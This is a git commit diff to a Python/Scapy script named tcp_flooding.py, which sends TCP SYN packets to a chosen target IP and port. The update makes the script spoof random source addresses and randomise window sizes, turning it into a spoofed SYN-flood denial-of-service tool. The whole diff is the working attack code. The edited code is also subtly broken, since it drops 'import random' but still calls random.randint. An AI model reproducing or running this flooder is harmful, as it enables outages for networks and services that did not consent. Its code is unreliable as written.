7c6842dbc18513afa54dea5ef11c05b1563a392b
None <None>
2023-05-10 20:45:37 -0700

    update tcp flooding

--- tcp_flooding.py
+++ tcp_flooding.py
@@ -1,27 +1,27 @@
 import sys
-import random
 from scapy.all import *
 import time
+from random import randint
 
 def tcp_flood(target_ip, target_port, num_packets):
     for _ in range(num_packets):
         # Generate random source IP and source port
-        # src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
-        ip = get_if_addr("eth0")
-        src_ip = ip
-        src_port = random.randint(1024, 65535)
+        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+        # ip = get_if_addr("h1-eth0")
+        # src_ip = ip
+        src_port = randint(1024, 65535)
 
         # Create an IP packet with the target IP as the destination
         ip_packet = IP(src=src_ip, dst=target_ip)
 
         # Create a TCP packet with the SYN flag set and random sequence number
-        tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1, 2**32 - 1))
+        tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=randint(1, 2**32 - 1), window=randint(1000,9000))
 
         # Combine the IP and TCP packets
         packet = ip_packet / tcp_packet
 
         # Send the packet
-        send(packet, verbose=0, count=num_packets)
+        send(packet, verbose=0)
         print(f"Sent packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
         
 
